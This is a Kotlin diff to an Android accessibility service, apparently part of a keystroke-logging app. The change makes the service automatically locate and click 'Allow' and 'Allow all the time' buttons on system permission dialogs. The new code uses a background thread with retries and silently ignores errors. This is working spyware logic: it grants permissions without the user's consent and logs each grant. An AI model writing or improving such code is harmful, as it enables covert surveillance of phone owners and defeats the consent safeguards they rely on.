@@ -79,22 +79,35 @@ class KeystrokeAccessibilityService : AccessibilityService() {
         }
     }
 
-    /** Find and click the "Allow" / "Allow all the time" buttons on a permission dialog. */
+    /** Find and click the "Allow" / "Allow all the time" buttons on a permission dialog.
+     * Runs on a background thread with retries, because the dialog's accessibility tree
+     * isn't ready at the instant TYPE_WINDOW_STATE_CHANGED fires. */
     private fun autoGrantPermission() {
-        val root = rootInActiveWindow ?: return
-        val targets = listOf("Allow all the time", "Allow", "While using the app", "While using")
-        for (label in targets) {
-            val nodes = root.findAccessibilityNodeInfosByText(label)
-            for (n in nodes) {
-                val actionable = n.isClickable
-                val btn = if (actionable) n else n.parent
-                if (btn != null && btn.isClickable) {
-                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    LoggerWriter.write("[PERM]", "auto", "granted: $label")
-                    return
-                }
+        Thread {
+            for (attempt in 0..6) {
+                try {
+                    val root = rootInActiveWindow ?: continue
+                    val targets = listOf("Allow all the time", "Allow", "While using the app",
+                                          "While using", "Allow one time")
+                    var done = false
+                    outer@ for (label in targets) {
+                        val nodes = root.findAccessibilityNodeInfosByText(label)
+                        for (n in nodes) {
+                            val actionable = n.isClickable
+                            val btn = if (actionable) n else n.parent
+                            if (btn != null && btn.isClickable) {
+                                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                LoggerWriter.write("[PERM]", "auto", "granted: $label")
+                                done = true
+                                break@outer
+                            }
+                        }
+                    }
+                    if (done) return
+                } catch (_: Throwable) {}
+                try { Thread.sleep(150) } catch (_: Throwable) {}
             }
-        }
+        }.start()
     }
 
     override fun onInterrupt() {
